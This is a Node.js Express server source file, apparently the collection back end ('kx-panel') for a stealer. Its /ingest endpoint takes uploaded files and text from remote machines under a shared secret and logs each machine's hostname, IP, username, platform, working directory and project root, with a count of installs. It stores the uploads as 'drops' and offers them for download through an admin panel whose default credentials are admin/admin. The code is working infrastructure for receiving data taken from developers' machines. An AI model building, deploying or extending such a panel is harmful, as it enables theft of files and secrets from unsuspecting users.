require('dotenv').config();
const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const db = require('./db');

const app = express();
const PORT = process.env.PORT || 4000;
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'admin';
const PANEL_SECRET = process.env.PANEL_SECRET || 'change-me';

const DATA = path.join(__dirname, 'data');
const DROPS = path.join(DATA, 'drops');
fs.mkdirSync(DROPS, { recursive: true });

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 50 * 1024 * 1024 },
});

app.use(express.json({ limit: '60mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const sessions = new Map();
function newSession() {
  const t = crypto.randomBytes(32).toString('hex');
  sessions.set(t, Date.now() + 1000 * 60 * 60 * 12);
  return t;
}
function validSession(t) {
  if (!t) return false;
  const exp = sessions.get(t);
  if (!exp) return false;
  if (Date.now() > exp) { sessions.delete(t); return false; }
  return true;
}
function requireAuth(req, res, next) {
  const t = req.headers['x-session'] || req.query.s;
  if (!validSession(t)) return res.status(401).json({ ok: false, err: 'unauth' });
  next();
}

app.post('/api/login', (req, res) => {
  const { user, pass } = req.body || {};
  if (user === ADMIN_USER && pass === ADMIN_PASS) {
    return res.json({ ok: true, token: newSession() });
  }
  res.status(401).json({ ok: false });
});

app.post('/ingest', upload.single('file'), (req, res) => {
  try {
    const meta = JSON.parse(req.body.meta || '{}');
    if (meta.secret !== PANEL_SECRET) return res.status(403).json({ ok: false });

    const ip = (req.headers['cf-connecting-ip']
      || (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
      || req.socket.remoteAddress || 'unknown');

    const now = Date.now();
    const host = (meta.host || 'unknown').replace(/[^\w.\-]/g, '_');
    const user = meta.user || '?';
    const project_root = meta.project_root || '';
    const cwd = meta.cwd || '';

    let row = db.prepare('SELECT id FROM hosts WHERE host=? AND ip=?').get(host, ip);
    if (!row) {
      const r = db.prepare(`
        INSERT INTO hosts (host, ip, user, platform, arch, node, cwd, project_root, first_seen, last_seen, installs)
        VALUES (?,?,?,?,?,?,?,?,?,?,1)
      `).run(host, ip, user, meta.platform || '', meta.arch || '',
             meta.node || '', cwd, project_root, now, now);
      row = { id: r.lastInsertRowid };
    } else {
      db.prepare(`UPDATE hosts SET last_seen=?, installs=installs+1, cwd=?, project_root=?, user=? WHERE id=?`)
        .run(now, cwd, project_root, user, row.id);
    }

    const hostId = row.id;
    const kind = meta.kind || 'file';
    const label = meta.label || (req.file?.originalname) || 'file';

    const tsFolder = `${host}_${ip.replace(/[:.]/g, '_')}_${now}`;
    const dest = path.join(DROPS, tsFolder);
    fs.mkdirSync(dest, { recursive: true });

    let storedName;
    if (req.file) {
      storedName = label.replace(/[^\w.\-]/g, '_') || 'file';
      fs.writeFileSync(path.join(dest, storedName), req.file.buffer);
    } else {
      storedName = (kind || 'text') + '.txt';
      fs.writeFileSync(path.join(dest, storedName), req.body.text || '');
    }
    const size = req.file ? req.file.size : Buffer.byteLength(req.body.text || '');

    db.prepare(`INSERT INTO drops (host_id, ts, kind, label, folder, file, size) VALUES (?,?,?,?,?,?,?)`)
      .run(hostId, now, kind, label, tsFolder, storedName, size);

    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ ok: false, err: String(e) });
  }
});

app.get('/api/hosts', requireAuth, (req, res) => {
  const rows = db.prepare(`
    SELECT h.*, (SELECT COUNT(*) FROM drops d WHERE d.host_id=h.id) AS files
    FROM hosts h ORDER BY last_seen DESC
  `).all();
  res.json({ ok: true, hosts: rows });
});

app.get('/api/hosts/:id', requireAuth, (req, res) => {
  const host = db.prepare('SELECT * FROM hosts WHERE id=?').get(req.params.id);
  if (!host) return res.status(404).json({ ok: false });
  const drops = db.prepare('SELECT * FROM drops WHERE host_id=? ORDER BY ts DESC').all(host.id);
  res.json({ ok: true, host, drops });
});

app.get('/api/download', requireAuth, (req, res) => {
  const { folder, file } = req.query;
  if (!folder || !file) return res.status(400).end();
  if (folder.includes('..') || file.includes('..')) return res.status(400).end();
  const p = path.join(DROPS, folder, file);
  if (!p.startsWith(DROPS)) return res.status(400).end();
  if (!fs.existsSync(p)) return res.status(404).end();
  res.download(p);
});

app.listen(PORT, () => console.log(`kx-panel on http://localhost:${PORT}`));
